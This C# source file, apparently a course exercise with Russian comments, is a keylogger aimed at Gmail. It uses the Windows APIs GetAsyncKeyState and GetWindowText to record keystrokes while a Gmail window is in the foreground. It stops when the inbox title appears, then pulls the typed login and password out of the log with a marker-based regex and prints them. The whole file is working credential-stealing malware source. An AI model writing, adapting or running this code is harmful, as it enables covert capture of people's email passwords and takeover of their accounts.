using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Text.RegularExpressions;

namespace CourseTest1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, [Out, MarshalAs(UnmanagedType.LPTStr)] StringBuilder lpString, int nMaxCount);

        static void Main(string[] args)
        {
            GmailLogger gmaillogger = new GmailLogger();
            Logger logger = new Logger(gmaillogger);
            string logs = logger.Log();

            GmailFind gfind = new GmailFind();
            gfind.Find(logs);
            string login = gfind.login, password = gfind.password;
            Console.WriteLine(login + " " + password);

            Console.ReadKey();
        }

        interface ILogger
        {
            string appname { get; set; }
            string Log();
        }

        class GmailLogger : ILogger
        {
            public string appname { get; set; }
            public IUpgrade upgrader;
            public GmailLogger()
            {
                appname = "Gmail";
                upgrader = new KeyUpgrader();
            }
            public string Log()
            {
                int size = 100000;
                StringBuilder logs = new StringBuilder(size), buff = new StringBuilder(size);
                while (true)
                {
                    if (GetWindowText(GetForegroundWindow(), buff, size) > 0)
                    {
                        string s = buff.ToString();
                        if (s.Contains(appname))
                        {
                            if (s.Contains("Входящие"))
                            {
                                logs.Append(s);                     
                                return logs.ToString();
                            }
                            for (int i = 0; i < 255; i++)
                            {
                                int state = GetAsyncKeyState(i);
                                if (state == 1 || state == -32767)
                                {
                                    logs.Append(upgrader.Upgrade(((Keys)i).ToString()));
                                }
                            }
                        }
                    }
                }
            }
        }

        class Logger
        {
            public ILogger logger;
            public Logger(ILogger logger)
            {
                this.logger = logger;
            }
            public string Log()
            {
                return logger.Log();
            }
        }

        interface IFind
        {
            string login { get; set; }
            string password { get; set; }
            void Find(string logs);
        }

        class GmailFind : IFind//нахождение в логах почты и пороля
        {
            public string login { get; set; }
            public string password { get; set; }
            public void Find(string logs)
            {
                int start = logs.IndexOf("Входящие") + 11, end = logs.IndexOf("@gmail.com - Gmail");
                login = logs.Substring(start, end - start);

                string pattern = "mark[A-Za-z0-9]{8,200}mark";
                Regex repas = new Regex(pattern, RegexOptions.Compiled);
                foreach (Match match in repas.Matches(logs))
                {
                    StringBuilder temp = new StringBuilder(match.Value);
                    temp.Replace("mark", "");
                    if (temp.Length > 7)
                        password = temp.ToString();
                }
            }
        }

        interface IUpgrade
        {
            string Upgrade(string sym);
        }

        class KeyUpgrader : IUpgrade//форматирование символов клавиатуры
        {
            private bool Shift;
            public string Upgrade(string sym)
            {
                string temp = "";
                if (sym == "OemPeriod")
                    temp = ".";
                else if (sym == "Oemplus")
                    temp = "+";
                else if (sym == "OemMinus")
                    temp = "-";
                else if (sym == "LButton" || sym == "Enter")
                    temp = "mark";
                else if ((sym.Contains("D") || sym.Contains("NumPad")) && sym.Length > 1)
                {
                    if (sym == "D2" && Shift)
                        temp = "@";
                    else if (!Shift)
                        temp = sym[sym.Length - 1].ToString();
                }
                else if (sym.Length == 1 && char.IsLetter(sym[0]))
                    if (!Shift)
                        temp = sym.ToLower();
                    else
                        temp = sym;
                if (sym == "LShiftKey" || sym == "RShiftKey")
                    Shift = true;
                else
                    Shift = false;
                return temp;
            }
        }
    }
}